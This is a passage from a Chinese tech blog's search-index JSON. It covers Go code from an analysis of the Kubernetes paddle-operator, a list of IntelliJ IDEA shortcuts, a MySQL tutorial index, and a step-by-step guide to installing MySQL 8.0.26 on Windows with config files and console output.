pdj.Spec.Worker.Replicas), } envTimeout := corev1.EnvVar{ Name: \"PADDLE_ELASTIC_TIMEOUT\", Value: \"60\", } pod.Spec.Containers[0].Env = append(pod.Spec.Containers[0].Env, envJobID, envNP, envTimeout) } else { // 场景2. 无pdj.Spec.Elastic时，pod的Containers需要使用pdj构造好的configmap envF := corev1.EnvFromSource{ ConfigMapRef: \u0026corev1.ConfigMapEnvSource{ LocalObjectReference: corev1.LocalObjectReference{ Name: pdj.Name, }, }, } pod.Spec.Containers[0].EnvFrom = append(pod.Spec.Containers[0].EnvFrom, envF) } if pdj.Spec.Intranet == pdv1.Service { // 给容器添加端口PADDLE_PORT 2379 pod.Spec.Containers[0].Ports = append(pod.Spec.Containers[0].Ports, corev1.ContainerPort{ContainerPort: PADDLE_PORT}) } else if pdj.Spec.Intranet == pdv1.HostNetwork { pod.Spec.HostNetwork = true } // 配置pod RestartPolicy if pdj.Spec.Elastic != nil { pod.Spec.RestartPolicy = \"OnFailure\" } else if pod.Spec.RestartPolicy == \"\" { if resType == pdv1.ResourceWorker \u0026\u0026 pdj.Spec.Intranet == pdv1.Service { pod.Spec.RestartPolicy = \"OnFailure\" } else { pod.Spec.RestartPolicy = \"Never\" } } return pod } ","date":"2021-11-03","objectID":"/posts/2021/11/paddle-operator%E5%88%86%E6%9E%90/:6:0","tags":["K8S"],"title":"paddle-operator分析","uri":"/posts/2021/11/paddle-operator%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"状态图 paddle job状态图，如下： 说明： operator目前处理使用的 padddle job状态有： Pending Starting Running Completed Failed Pending为初态 Failed和Completed是终态 operator对pod 真正Running判断成立条件：pod的status和其所有容器的status都是running，且容器ready Starting是operator的paddle job自定义状态ResourceStatus.Starting:，从k8s Running pod进一步处理得出： 对Running pod进行了细分，表示pod是否RealRunning，即pod中的容器是否ready ","date":"2021-11-03","objectID":"/posts/2021/11/paddle-operator%E5%88%86%E6%9E%90/:7:0","tags":["K8S"],"title":"paddle-operator分析","uri":"/posts/2021/11/paddle-operator%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"其它 // PaddleJob status type ResourceStatus struct { // Pending Pending int `json:\"pending,omitempty\"` // Starting Starting int `json:\"starting,omitempty\"` // Running Running int `json:\"running,omitempty\"` // Failed Failed int `json:\"failed,omitempty\"` // Success Succeeded int `json:\"succeeded,omitempty\"` // Unknown Unknown int `json:\"unknown,omitempty\"` // A list of pointer to pods Refs []corev1.ObjectReference `json:\"refs,omitempty\"` } func (pdj *PaddleJob) GetSpecs() map[string]*ResourceSpec { return map[string]*ResourceSpec{ ResourcePS: pdj.Spec.PS, ResourceWorker: pdj.Spec.Worker, ResourceHeter: pdj.Spec.Heter, } } func (pdj *PaddleJob) GetStatuses() map[string]*ResourceStatus { return map[string]*ResourceStatus{ ResourcePS: pdj.Status.PS, ResourceWorker: pdj.Status.Worker, ResourceHeter: pdj.Status.Heter, } } //----------------------------- //----------------------------- // pdj的一些状态设置函数 //----------------------------- //----------------------------- func getPaddleJobPhase(pdj *pdv1.PaddleJob) pdv1.PaddleJobPhase { // final phase won't change any more if pdj.Status.Phase == pdv1.Completed { return pdv1.Completed } else if pdj.Status.Phase == pdv1.Failed { return pdv1.Failed } specs := pdj.GetSpecs() statuses := pdj.GetStatuses() for _, status := range statuses { if isFailed(status) { return pdv1.Failed } else if isPending(status) { return pdv1.Pending } else if isStarting(status) { return pdv1.Starting } } checkAll := func(check func(spec *pdv1.ResourceSpec, status *pdv1.ResourceStatus) bool) bool { for k, _ := range statuses { if !check(specs[k], statuses[k]) { return false } } return true } if checkAll(isRunning) { return pdv1.Running } if checkAll(isCompleted) { return pdv1.Completed } if pdj.Status.Phase == \"\" { return pdv1.Pending } return pdj.Status.Phase } func getPaddleJobStartTime(pdj *pdv1.PaddleJob) *metav1.Time { if pdj.Status.StartTime.IsZero() \u0026\u0026 pdj.Status.Phase == pdv1.Running { tmp := metav1.Now() return \u0026tmp } return pdj.Status.StartTime } func getPaddleJobCompleteTime(pdj *pdv1.PaddleJob) *metav1.Time { if pdj.Status.CompletionTime.IsZero() \u0026\u0026 (pdj.Status.Phase == pdv1.Completed || pdj.Status.Phase == pdv1.Failed) { tmp := metav1.Now() return \u0026tmp } return pdj.Status.CompletionTime } func getPaddleJobMode(pdj *pdv1.PaddleJob) pdv1.PaddleJobMode { if pdj.Spec.PS != nil { return pdv1.PaddleJobModePS } else if pdj.Spec.Worker != nil \u0026\u0026 pdj.Spec.Worker.Replicas \u003e 1 { return pdv1.PaddleJobModeCollective } else { return pdv1.PaddleJobModeSingle } } ","date":"2021-11-03","objectID":"/posts/2021/11/paddle-operator%E5%88%86%E6%9E%90/:8:0","tags":["K8S"],"title":"paddle-operator分析","uri":"/posts/2021/11/paddle-operator%E5%88%86%E6%9E%90/"},{"categories":["软件"],"content":"掌握了这些IDEA快捷键基本上可以告别鼠标了。 📚spring-in-action-v5J IDEA快捷键文档 ","date":"2021-11-01","objectID":"/posts/2021/11/idea%E5%B8%B8%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE%E6%B1%87%E6%80%BB/:0:0","tags":["软件"],"title":"IDEA常用快捷键汇总","uri":"/posts/2021/11/idea%E5%B8%B8%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE%E6%B1%87%E6%80%BB/"},{"categories":["软件"],"content":"1.IDEA提高效率的快捷键 Ctrl+N 快速打开任何类文件. Ctrl+Shift+N 快速打开任何文件. Ctrl+Shift+F12 最大化代码窗口和最小化代码窗口来回切换. Ctrl+Space 代码自动补全 Alt+F7 查找光标所位置的类、方法、变量，在整个项目中使用特定类、方法或变量的所有位置。 Crtl+P 快速查看在编辑器的光标处使用的类或方法的文档。 ","date":"2021-11-01","objectID":"/posts/2021/11/idea%E5%B8%B8%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE%E6%B1%87%E6%80%BB/:1:0","tags":["软件"],"title":"IDEA常用快捷键汇总","uri":"/posts/2021/11/idea%E5%B8%B8%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE%E6%B1%87%E6%80%BB/"},{"categories":["软件"],"content":"2.IDEA编辑快捷键 Ctrl+Space 基本代码补全，包括任何类，任何方法，任何变量。 Ctrl+Shift+Space 智能代码补全(按预期类型筛选方法和变量列表) Ctrl+Shift+Enter 完整的语句 Ctrl+P 查看方法参数信息 Ctrl+Q 快速查找文档 Shift+F1 IDEA的外部文档 Ctrl+ mouse 查看代码的信息 Ctrl+F1 显示错误或警告的描述 Alt+Insert 生成代码，包含：Getters, Setters, Constructors, hashCode/equals, toString Ctrl+O 覆盖方法 Ctrl+I 实现接口中的方法 Ctrl+Alt+T 选择条件语句 (if..else, try..catch, for, synchronized, etc.) Ctrl+/ 用行注释注释/取消注释 Ctrl+Shift+/ 块注释/取消注释 Ctrl+W 选择代码块，每按一次则不断像外扩张 Ctrl+Shift+W 与上面相对应，不断缩小选择范围。 Alt+Q 上下文信息 Alt+Enter 显示意图、行动和快速修复 Ctrl+Alt+L 重新格式化代码 Ctrl+Alt+O 优化imports Ctrl+Alt+I 自动缩进 Tab/Shift+Tab 缩进或者取消缩进已选择的行 Ctrl+X/Shift+Delete 将当前行或选定块剪切到剪贴板 Ctrl+C/Ctrl+Insert 将当前行或选定的块复制到剪贴板 Ctrl+V/Shift+Insert 从剪贴板粘贴 Ctrl+Shift+V 从最近的缓冲区粘贴。 Ctrl+D 重复当前行或选定块 Ctrl+Y 删除光标所在的行 Ctrl+Shift+J 智能合并 Ctrl+Enter 智能拆分 Shift+Enter 新的行 Ctrl+Shift+U 为光标或选定块的单词切换大小写 Ctrl+Shift+]/[ 选择till代码块结束/开始 Ctrl+Del 删除光标后的字符串，会自动判断。 Ctrl+backspace 快速向前删除，会自动判断。 Ctrl+ 加号/减号 展开/折叠代码块 Ctrl+Shift+加号/减号 展开所有/折叠所有代码块 Ctrl+F4 关闭活动编辑器选项卡 Alt+F7/Ctrl+F7 查找在哪里使用/查找文件中的在哪里使用 Ctrl+Shift+F7 高亮显示文件用到的地方，例如变量、方法 Ctrl+Alt+F7 显示用到的地方 F5 复制 F6 移动 Alt+Delete 安全删除 Shift+F6 重命名文件 Ctrl+F6 更改签名 Ctrl+Alt+N Inline Ctrl+Alt+M 提取方法 Ctrl+Alt+V 提取变量 Ctrl+Alt+F 提取字段 Ctrl+Alt+C 提取常量 Ctrl+Alt+P 提取参数 ","date":"2021-11-01","objectID":"/posts/2021/11/idea%E5%B8%B8%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE%E6%B1%87%E6%80%BB/:2:0","tags":["软件"],"title":"IDEA常用快捷键汇总","uri":"/posts/2021/11/idea%E5%B8%B8%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE%E6%B1%87%E6%80%BB/"},{"categories":["软件"],"content":"3.IDEA搜索和替换快捷键 双击Shift 在整个项目中搜索文本、文件 Ctrl+F 当前文件查找 F3/Shift+F3 查找下一个或者上一个 Ctrl+R 替换当前文件的某个字段 Ctrl+Shift+F 在项目中查找文本 Ctrl+Shift+R 在项目中替换文本 ","date":"2021-11-01","objectID":"/posts/2021/11/idea%E5%B8%B8%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE%E6%B1%87%E6%80%BB/:3:0","tags":["软件"],"title":"IDEA常用快捷键汇总","uri":"/posts/2021/11/idea%E5%B8%B8%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE%E6%B1%87%E6%80%BB/"},{"categories":["软件"],"content":"4. IDEA编译和运行快捷键 Ctrl+F9 Make项目(编译修改和依赖) Ctrl+Shift+F9 编译选定的文件、包或模块 Alt+Shift+F10 选择配置并运行 Alt+Shift+F9 选择配置和调试 Shift+F10 运行 Shift+F9 Debug Ctrl+Shift+F10 从编辑器运行上下文配置 ","date":"2021-11-01","objectID":"/posts/2021/11/idea%E5%B8%B8%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE%E6%B1%87%E6%80%BB/:4:0","tags":["软件"],"title":"IDEA常用快捷键汇总","uri":"/posts/2021/11/idea%E5%B8%B8%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE%E6%B1%87%E6%80%BB/"},{"categories":["软件"],"content":"5.IDEA debug调试快捷键 Ctrl+K Commit项目到VCS Ctrl+T 从VCS更新项目 Alt+Shift+C 查看最近的更改 Alt+` 快速弹出VCS F8 步出 F7 步进 Shift+F7 智能步进 Shift+F8 智能步出 Alt+F9 定位到光标地方 Alt+F8 计算表达式 F9 回复程序 Ctrl+F8 切换断点 Ctrl+Shift+F8 查看断点 ","date":"2021-11-01","objectID":"/posts/2021/11/idea%E5%B8%B8%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE%E6%B1%87%E6%80%BB/:5:0","tags":["软件"],"title":"IDEA常用快捷键汇总","uri":"/posts/2021/11/idea%E5%B8%B8%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE%E6%B1%87%E6%80%BB/"},{"categories":["软件"],"content":"6.IDEA实时代码模板快捷键快捷键 Ctrl+Alt+J 环绕活动模板 Ctrl+J 插入实时代码模板 Ctrl+J - iter 按照Java SDK 1.5的风格进行迭代 Ctrl+J - inst 用instanceof检查对象类型并向下转换它 Ctrl+J - itco Iterate Collection /迭代java.util.Collection的元素 Ctrl+J - itit Iterate Itterator / IIterate elements of java.util.Iterator Ctrl+J - itli Iterate List /迭代java.util.List的元素 Ctrl+J - psf Public static final Ctrl+J - thr throw new ","date":"2021-11-01","objectID":"/posts/2021/11/idea%E5%B8%B8%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE%E6%B1%87%E6%80%BB/:6:0","tags":["软件"],"title":"IDEA常用快捷键汇总","uri":"/posts/2021/11/idea%E5%B8%B8%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE%E6%B1%87%E6%80%BB/"},{"categories":["软件"],"content":"7.IDEA导航快捷键 Ctrl+N 搜索类 Ctrl+Shift+N 搜索文件 Ctrl+Alt+Shift+N 搜索符号，不知道怎么用 Alt+ Right/Left 转到下一个/上一个编辑器选项卡 F12 回到上一个工具窗口 Esc 进入编辑器(从工具窗口) Shift+Esc 隐藏活动窗口或上次活动窗口 Ctrl+Shift+F4 关闭活动运行/信息/查找/…的选项卡 Ctrl+G Go to line Ctrl+E 最近文件弹出 Ctrl+Alt+Arrow 左/箭头向右向后/向前导航 Ctrl+Shift+Backspace 导航到最后一个编辑位置 Alt+F1 在任何视图中选择当前文件或符号 Ctrl+B/Ctrl+ 点击去声明 Ctrl+Alt+B 去实现 Ctrl+Shift+I 打开快速定义查找 Ctrl+Shift+B 转到类型声明 Ctrl+U 父类方法/超类 Alt+Arrow 向上/向下转到上一个/下一个方法 Ctrl+]/[ 移动到代码块结束、移动到代码块开始 Ctrl+F12 弹出文件结构 Ctrl+H 类型层次结构 Ctrl+Shift+H 方法层次结构 Ctrl+Alt+H 调用层次结构 F2/Shift+F2 上一个高亮的错误/下一个高亮错误 F4/Ctrl+Enter 编辑资源/查看资源 Alt+Home 显示导航栏 F11 切换书签 Ctrl+F11 切换书签与助记符 Ctrl+0…9 定位书签 Shift+F11 显卡书签 ","date":"2021-11-01","objectID":"/posts/2021/11/idea%E5%B8%B8%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE%E6%B1%87%E6%80%BB/:7:0","tags":["软件"],"title":"IDEA常用快捷键汇总","uri":"/posts/2021/11/idea%E5%B8%B8%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE%E6%B1%87%E6%80%BB/"},{"categories":["软件"],"content":"8. IDEA常用快捷键 Alt+0…9 打开相应的工具窗口 Ctrl+S 保存所有 Ctrl+Alt+Y 同步 Ctrl+Shift+F12 最大化切换编辑器 Alt+Shift+F 添加到收藏夹” Alt+Shift+I 用当前配置文件检查当前文件 Ctrl+` 快速切换当前方案 Ctrl+Alt+S 打开设置对话框 Ctrl+Alt+Shift+S 打开项目结构对话框 Ctrl+Shift+A Find Action Ctrl+Tab 在选项卡和工具窗口之间切换 Ctrl+Shift+Alt+Insert 创建新的划痕文件 ","date":"2021-11-01","objectID":"/posts/2021/11/idea%E5%B8%B8%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE%E6%B1%87%E6%80%BB/:8:0","tags":["软件"],"title":"IDEA常用快捷键汇总","uri":"/posts/2021/11/idea%E5%B8%B8%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE%E6%B1%87%E6%80%BB/"},{"categories":["软件"],"content":"9. IDEA多处选择快捷键 Alt+Shift+点击鼠标 添加或者删除一个选择 Alt+J 选择下一个事件 Shift+Alt+J 取消选择下一个事件 Shift+Ctrl+Alt+J 选择所有事件 Esc 取消所有选择 以上就是IDEA所有的快捷键的全部内容。喜欢可以收藏，忘了可以查询。 ","date":"2021-11-01","objectID":"/posts/2021/11/idea%E5%B8%B8%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE%E6%B1%87%E6%80%BB/:9:0","tags":["软件"],"title":"IDEA常用快捷键汇总","uri":"/posts/2021/11/idea%E5%B8%B8%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE%E6%B1%87%E6%80%BB/"},{"categories":["数据库"],"content":"备注：非本人原创，本人在学习 MySQL 过程中发现这个网站 http://www.yiibai.com 的 MySQL 教程挺好的，只是排版混乱，无法快速查阅，于是重新排版，方便查看。 在线阅读，请点击：https://legacy.gitbook.com/book/necan/mysql-tutorial/details github： https://github.com/necan/MySQL-Tutorial ","date":"2021-10-30","objectID":"/posts/2021/10/mysql%E6%95%99%E7%A8%8B/:0:0","tags":["MySQL"],"title":"MySQL教程","uri":"/posts/2021/10/mysql%E6%95%99%E7%A8%8B/"},{"categories":["数据库"],"content":"开发人员的 MySQL 教程 如果你是一个寻找学习 MySQL 的 web 开发人员，在本节中，您可立即开始学习使用 MySQL，并学习如何有效地使用 MySQL来更有效地完成您的工作。 如果您浏览整个教程，了解如何使用如 SQL 查询，MySQL 存储过程，数据库视图，触发器等各种技术来管理 MySQL 数据库和操作数据。 ","date":"2021-10-30","objectID":"/posts/2021/10/mysql%E6%95%99%E7%A8%8B/:1:0","tags":["MySQL"],"title":"MySQL教程","uri":"/posts/2021/10/mysql%E6%95%99%E7%A8%8B/"},{"categories":["数据库"],"content":"第一章 基础教程 本节将帮助您熟悉基本的 MySQL 知识，包括使用各种 SQL 语句(如INSERT，DELETE，UPDATE和SELECT)来管理 MySQL 数据库和操作数据。还将了解高级数据查询技术，包括INNER JOIN，LEFT JOIN，子查询，UNION等。 参考阅读：http://www.yiibai.com/mysql/basic-mysql.html ","date":"2021-10-30","objectID":"/posts/2021/10/mysql%E6%95%99%E7%A8%8B/:1:1","tags":["MySQL"],"title":"MySQL教程","uri":"/posts/2021/10/mysql%E6%95%99%E7%A8%8B/"},{"categories":["数据库"],"content":"第二章 常用技巧 本节将提供一些高级的 MySQL 技术和技巧，以帮助您有效解决 MySQL 中遇到的一些棘手的问题。 参考阅读：http://www.yiibai.com/mysql/mysqltips.html ","date":"2021-10-30","objectID":"/posts/2021/10/mysql%E6%95%99%E7%A8%8B/:1:2","tags":["MySQL"],"title":"MySQL教程","uri":"/posts/2021/10/mysql%E6%95%99%E7%A8%8B/"},{"categories":["数据库"],"content":"第三章 存储过程 在本节中，您将学习如何在 MySQL 中创建存储过程，并通过明确的说明和示例演示如何使用存储过程。 参考阅读：http://www.yiibai.com/mysql/stored-procedure.html ","date":"2021-10-30","objectID":"/posts/2021/10/mysql%E6%95%99%E7%A8%8B/:1:3","tags":["MySQL"],"title":"MySQL教程","uri":"/posts/2021/10/mysql%E6%95%99%E7%A8%8B/"},{"categories":["数据库"],"content":"第四章 触发器 MySQL 触发器是自动执行以响应与表相关联的特定事件的存储程序，例如插入，更新或删除记录。 本节介绍如何使用 MySQL 数据库触发器。 参考阅读：http://www.yiibai.com/mysql/triggers.html ","date":"2021-10-30","objectID":"/posts/2021/10/mysql%E6%95%99%E7%A8%8B/:1:4","tags":["MySQL"],"title":"MySQL教程","uri":"/posts/2021/10/mysql%E6%95%99%E7%A8%8B/"},{"categories":["数据库"],"content":"第五章 视图 在本节中，您将了解数据库视图，如何创建数据库视图并在 MySQL 中进行管理。 参考阅读：http://www.yiibai.com/mysql/views.html ","date":"2021-10-30","objectID":"/posts/2021/10/mysql%E6%95%99%E7%A8%8B/:1:5","tags":["MySQL"],"title":"MySQL教程","uri":"/posts/2021/10/mysql%E6%95%99%E7%A8%8B/"},{"categories":["数据库"],"content":"第六章 全文搜索 在本节中，演示如何使用 MySQL 全文搜索与各种全文搜索技术，如自然语言搜索，布尔语言搜索和查询扩展。 参考阅读：http://www.yiibai.com/mysql/full-text-search.html ","date":"2021-10-30","objectID":"/posts/2021/10/mysql%E6%95%99%E7%A8%8B/:1:6","tags":["MySQL"],"title":"MySQL教程","uri":"/posts/2021/10/mysql%E6%95%99%E7%A8%8B/"},{"categories":["数据库"],"content":"第七章 MySQL 函数 本节提供最常用的 MySQL 函数，包括聚合函数，字符串函数，日期和时间函数以及控制流函数使用和示例。 参考阅读：http://www.yiibai.com/mysql/functions.html ","date":"2021-10-30","objectID":"/posts/2021/10/mysql%E6%95%99%E7%A8%8B/:1:7","tags":["MySQL"],"title":"MySQL教程","uri":"/posts/2021/10/mysql%E6%95%99%E7%A8%8B/"},{"categories":["数据库"],"content":"数据库管理员的 MySQL 教程 这个分步教程为您提供了有关 MySQL 管理更深层次的信息。 这里涵盖了从基础到高级 MySQL 管理和配置的一切知识。本节中介绍的所有 MySQL 管理教程都是很实用的，您可在企业生产环境中应用(使用)。 ","date":"2021-10-30","objectID":"/posts/2021/10/mysql%E6%95%99%E7%A8%8B/:2:0","tags":["MySQL"],"title":"MySQL教程","uri":"/posts/2021/10/mysql%E6%95%99%E7%A8%8B/"},{"categories":["数据库"],"content":"第八章 MySQL 管理 在本节中，您将找到许多有用的 MySQL 管理教程，包括 MySQL 服务器启动和关闭，MySQL 服务器安全性，MySQL 数据库维护，备份和复制。 参考阅读：http://www.yiibai.com/mysql/administration.html ","date":"2021-10-30","objectID":"/posts/2021/10/mysql%E6%95%99%E7%A8%8B/:2:1","tags":["MySQL"],"title":"MySQL教程","uri":"/posts/2021/10/mysql%E6%95%99%E7%A8%8B/"},{"categories":["数据库"],"content":"Windows环境中，MySQL数据库安装配置 mysql数据库下载地址： https://dev.mysql.com/downloads/mysql/ 下载版本：MySQL Community Server 8.0.26 ","date":"2021-10-21","objectID":"/posts/2021/10/windows%E5%AE%89%E8%A3%85mysql/:0:0","tags":["MySQL"],"title":"Windows安装MySQL","uri":"/posts/2021/10/windows%E5%AE%89%E8%A3%85mysql/"},{"categories":["数据库"],"content":"安装mysql 解压mysql文件到#D:\\Program Files (x86)\\ 把D:\\Program Files (x86)\\mysql-8.0.26-winx64\\bin 添加为环境变量 创建mysql的data目录，如：D:\\Program Files (x86)\\mysql-8.0.26-winx64\\bin\\Data 编辑mysql服务配置文件my.ini，文件路径为D:\\Program Files (x86)\\mysql-8.0.26-winx64\\my.ini 以系统管理员身份 运行cmd ","date":"2021-10-21","objectID":"/posts/2021/10/windows%E5%AE%89%E8%A3%85mysql/:1:0","tags":["MySQL"],"title":"Windows安装MySQL","uri":"/posts/2021/10/windows%E5%AE%89%E8%A3%85mysql/"},{"categories":["数据库"],"content":"mysql配置文件my.ini [mysqld]# 设置3306端口port=3306# 设置mysql的安装目录basedir=D:\\\\Program Files (x86)\\\\mysql-8.0.26-winx64# 设置mysql数据库的数据的存放目录datadir=D:\\\\Program Files (x86)\\\\mysql-8.0.26-winx64\\Data # 允许最大连接数max_connections=200# 允许连接失败的次数。max_connect_errors=10# 服务端使用的字符集默认为utf8mb4character-set-server=utf8mb4# 创建新表时将使用的默认存储引擎default-storage-engine=INNODB# 默认使用“mysql_native_password”插件认证#mysql_native_passworddefault_authentication_plugin=mysql_native_password[mysql]# 设置mysql客户端默认字符集default-character-set=utf8mb4[client]# 设置mysql客户端连接服务端时默认使用的端口port=3306default-character-set=utf8mb4 以系统管理员身份 运行cmd C:\\Windows\\System32\\cmd.exe 注意：执行shell命令使用cmd，不要使用git shell ","date":"2021-10-21","objectID":"/posts/2021/10/windows%E5%AE%89%E8%A3%85mysql/:1:1","tags":["MySQL"],"title":"Windows安装MySQL","uri":"/posts/2021/10/windows%E5%AE%89%E8%A3%85mysql/"},{"categories":["数据库"],"content":"部署mysql服务 #D:\\Program Files (x86)\\mysql-8.0.26-winx64\\bin #mysqld --initialize-insecure --console # mysql 初始化，并记录初始密码 mysqld --initialize --console mysqld -install net start mysql # mysql -u root -p 或 mysql -h localhost -u root -P 3306 -p '初始密码' # 输入初始密码登录 mysql -u root -p # 修改密码 ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY '111111'; ","date":"2021-10-21","objectID":"/posts/2021/10/windows%E5%AE%89%E8%A3%85mysql/:2:0","tags":["MySQL"],"title":"Windows安装MySQL","uri":"/posts/2021/10/windows%E5%AE%89%E8%A3%85mysql/"},{"categories":["数据库"],"content":"停止mysql服务 net stop mysql mysqld -remove # 如果需要重新初始化配置mysql服务 initialize，要删除mysql的data目录， windows查看mysql端口和pid netstat -aon|findstr \"3306\" tasklist|findstr \"mysqld\" ","date":"2021-10-21","objectID":"/posts/2021/10/windows%E5%AE%89%E8%A3%85mysql/:3:0","tags":["MySQL"],"title":"Windows安装MySQL","uri":"/posts/2021/10/windows%E5%AE%89%E8%A3%85mysql/"},{"categories":["数据库"],"content":"命令过程信息 mysqld –initialize –console 命令会显示 mysql的初始密码：Lak/O0:6CZqB \\mysql-8.0.26-winx64\\bin\u003emysqld --initialize --console 2021-10-19T03:23:05.874376Z 0 [System] [MY-013169] [Server] D:\\Program Files (x86)\\mysql-8.0.26-winx64\\bin\\mysqld.exe (mysqld 8.0.26) initializing of server in progress as process 24480 2021-10-19T03:23:05.876211Z 0 [ERROR] [MY-010457] [Server] --initialize specified but the data directory has files in it. Aborting. 2021-10-19T03:23:05.876221Z 0 [ERROR] [MY-013236] [Server] The designated data directory D:\\Program Files (x86)\\mysql-8.0.26-winx64\\Data\\ is unusable. You can remove all files that the server added to it. 2021-10-19T03:23:05.888862Z 0 [ERROR] [MY-010119] [Server] Aborting 2021-10-19T03:23:05.891047Z 0 [System] [MY-010910] [Server] D:\\Program Files (x86)\\mysql-8.0.26-winx64\\bin\\mysqld.exe: Shutdown complete (mysqld 8.0.26) MySQL Community Server - GPL. mysqld --initialize --console 2021-10-19T03:23:40.722085Z 0 [System] [MY-013169] [Server] D:\\Program Files (x86)\\mysql-8.0.26-winx64\\bin\\mysqld.exe (mysqld 8.0.26) initializing of server in progress as process 26564 2021-10-19T03:23:40.752086Z 1 [System] [MY-013576] [InnoDB] InnoDB initialization has started. 2021-10-19T03:23:41.325011Z 1 [System] [MY-013577] [InnoDB] InnoDB initialization has ended. 2021-10-19T03:23:42.762468Z 0 [Warning] [MY-013746] [Server] A deprecated TLS version TLSv1 is enabled for channel mysql_main 2021-10-19T03:23:42.766289Z 0 [Warning] [MY-013746] [Server] A deprecated TLS version TLSv1.1 is enabled for channel mysql_main 2021-10-19T03:23:43.005898Z 6 [Note] [MY-010454] [Server] A temporary password is generated for root@localhost: Lak/O0:6CZqB \\mysql-8.0.26-winx64\\bin\u003enetstat -aon|findstr \"3306\" TCP 0.0.0.0:3306 0.0.0.0:0 LISTENING 24032 TCP 0.0.0.0:33060 0.0.0.0:0 LISTENING 24032 TCP 127.0.0.1:3306 127.0.0.1:51668 ESTABLISHED 24032 TCP 127.0.0.1:3306 127.0.0.1:51669 ESTABLISHED 24032 TCP 127.0.0.1:3306 127.0.0.1:51672 ESTABLISHED 24032 TCP 127.0.0.1:3306 127.0.0.1:51673 ESTABLISHED 24032 TCP 127.0.0.1:51668 127.0.0.1:3306 ESTABLISHED 21336 TCP 127.0.0.1:51669 127.0.0.1:3306 ESTABLISHED 21336 TCP 127.0.0.1:51672 127.0.0.1:3306 ESTABLISHED 21336 TCP 127.0.0.1:51673 127.0.0.1:3306 ESTABLISHED 21336 TCP [::]:3306 [::]:0 LISTENING 24032 TCP [::]:33060 [::]:0 LISTENING 24032 TCP [::1]:51535 [::1]:3306 TIME_WAIT 0 \\mysql-8.0.26-winx64\\bin\u003etasklist|findstr \"mysqld\" mysqld.exe 23212 Services 0 15,484 K mysqld.exe 24032 Services 0 191,632 K D:\\Program Files (x86)\\mysql-8.0.26-winx64\\bin\u003e $ net start mysql MySQL 服务正在启动 . MySQL 服务无法启动。 服务没有报告任何错误。 请键入 NET HELPMSG 3534 以获得更多的帮助。 # 使用--console 显示上面的报错信息 $ mysqld --console 2021-10-19T02:16:50.682868Z 0 [System] [MY-010116] [Server] D:\\Program Files (x86)\\mysql-8.0.26-winx64\\bin\\mysqld.exe (mysqld 8.0.26) starting as process 24392 2021-10-19T02:16:50.707857Z 1 [ERROR] [MY-011011] [Server] Failed to find valid data directory. 2021-10-19T02:16:50.708529Z 0 [ERROR] [MY-010020] [Server] Data Dictionary initialization failed. 2021-10-19T02:16:50.708748Z 0 [ERROR] [MY-010119] [Server] Aborting 2021-10-19T02:16:50.709331Z 0 [System] [MY-010910] [Server] D:\\Program Files (x86)\\mysql-8.0.26-winx64\\bin\\mysqld.exe: Shutdown complete (mysqld 8.0.26) MySQL Community Server - GPL. mysqld -remove Service successfully removed. mysqld --initialize-insecure mysqld -install Service successfully installed. $ net start mysql MySQL 服务正在启动 . MySQL 服务已经启动成功。 net stop mysql MySQL 服务正在停止. MySQL 服务已成功停止。 mysqld -remove Service successfully removed. ","date":"2021-10-21","objectID":"/posts/2021/10/windows%E5%AE%89%E8%A3%85mysql/:4:0","tags":["MySQL"],"title":"Windows安装MySQL","uri":"/posts/2021/10/windows%E5%AE%89%E8%A3%85mysql/"},{"categories":["数据库"],"content":"测试sql # 创建测试数据库 CREATE DATABASE IF NOT EXISTS yiibaidb DEFAULT CHARSET utf8 COLLATE utf8_general_ci; use yiibaidb; # 导入sql source D:/yiibaidb.sql; ","date":"2021-10-21","objectID":"/posts/2021/10/windows%E5%AE%89%E8%A3%85mysql/:5:0","tags":["MySQL"],"title":"Windows安装MySQL","uri":"/posts/2021/10/windows%E5%AE%89%E8%A3%85mysql/"},{"categories":["数据库"],"content":"ER图 ","date":"2021-10-21","objectID":"/posts/2021/10/windows%E5%AE%89%E8%A3%85mysql/:5:1","tags":["MySQL"],"title":"Windows安装MySQL","uri":"/posts/2021/10/windows%E5%AE%89%E8%A3%85mysql/"},{"categories":["数据库"],"content":"yiibaidb.sql /* ********************************************************************* http://www.yiibai.com/mysql/ ********************************************************************* Name: MySQL Sample Database classicmodels Link: http://www.yiibai.com/mysql/sample-database.html ********************************************************************* */ /*!40101 SET NAMES utf8 */; /*!40101 SET SQL_MODE=''*/; /*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */; /*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */; /*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */; /*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */; CREATE DATABASE /*!32312 IF NOT EXISTS*/`yiibaidb` /*!40100 DEFAULT CHARACTER SET utf8 */; USE `yiibaidb`; /* Navicat MySQL Data Transfer Source Server : localhost-57 Source Server Version : 50709 Source Host : localhost:3306 Source Database : yiibaidb Target Server Type : MYSQL Target Server Version : 50709 File Encoding : 65001 Date: 2017-07-20 21:08:41 */ SET FOREIGN_KEY_CHECKS=0; -- ---------------------------- -- 